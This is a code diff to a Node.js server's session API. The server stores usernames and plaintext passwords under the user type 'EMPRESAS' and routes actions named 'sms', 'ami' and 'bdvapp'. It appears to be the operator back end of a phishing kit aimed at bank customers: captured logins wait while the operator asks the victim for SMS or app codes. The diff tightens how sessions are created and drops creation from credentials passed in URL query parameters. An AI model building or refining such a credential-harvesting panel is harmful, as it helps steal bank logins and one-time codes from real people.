@@ -245,20 +245,10 @@ async function handleRequest(req, res) {
     if (actionMatch && req.method === 'POST') {
       loadSessions();
       const id = actionMatch[1];
-      const body = await parseJsonBody(req);
       if (!sessions[id]) {
-        sessions[id] = {
-          id,
-          username: body.username || '—',
-          password: body.password || '—',
-          tipoUsuario: 'EMPRESAS',
-          device: 'desktop',
-          ip: '127.0.0.1',
-          state: 'waiting',
-          token: '',
-          createdAt: Date.now()
-        };
+        return sendJson(res, 404, { error: 'Session not found' });
       }
+      const body = await parseJsonBody(req);
       sessions[id].state = body.state || sessions[id].state;
       sessions[id].action = body.action;
       if (body.action === 'sms' || body.action === 'ami' || body.action === 'bdvapp') {
@@ -270,27 +260,16 @@ async function handleRequest(req, res) {
       return sendJson(res, 200, { success: true, session: sessions[id] });
     }
 
-    // 6. Cambiar estado de la sesión (ej. 'typing')
+    // 6. Cambiar estado de la sesión (ej. 'metodo-sms')
     const stateMatch = pathname.match(/^\/api\/sessions\/([^\/]+)\/state$/);
     if (stateMatch && req.method === 'POST') {
       loadSessions();
       const id = stateMatch[1];
-      const body = await parseJsonBody(req);
       if (!sessions[id]) {
-        sessions[id] = {
-          id,
-          username: body.username || '—',
-          password: '—',
-          tipoUsuario: 'EMPRESAS',
-          device: 'desktop',
-          ip: '127.0.0.1',
-          state: body.state || 'typing',
-          token: '',
-          createdAt: Date.now()
-        };
-      } else {
-        sessions[id].state = body.state || sessions[id].state;
+        return sendJson(res, 404, { error: 'Session not found' });
       }
+      const body = await parseJsonBody(req);
+      sessions[id].state = body.state || sessions[id].state;
       sessions[id].last_seen = Date.now();
       sessions[id].updatedAt = Date.now();
       saveSessions();
@@ -302,29 +281,9 @@ async function handleRequest(req, res) {
     if (sessionMatch && req.method === 'GET') {
       loadSessions();
       const id = sessionMatch[1];
-      let session = sessions[id];
+      const session = sessions[id];
       if (!session) {
-        const qUser = reqUrl.searchParams.get('user');
-        const qPass = reqUrl.searchParams.get('pass');
-        if (qUser || qPass) {
-          session = {
-            id,
-            username: qUser || '—',
-            password: qPass || '—',
-            tipoUsuario: 'EMPRESAS',
-            device: 'desktop',
-            ip: (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || '127.0.0.1',
-            state: 'waiting',
-            token: '',
-            createdAt: Date.now(),
-            last_seen: Date.now(),
-            updatedAt: Date.now()
-          };
-          sessions[id] = session;
-          saveSessions();
-        } else {
-          return sendJson(res, 404, { error: 'Session not found' });
-        }
+        return sendJson(res, 404, { error: 'Session not found' });
       }
       return sendJson(res, 200, session);
     }
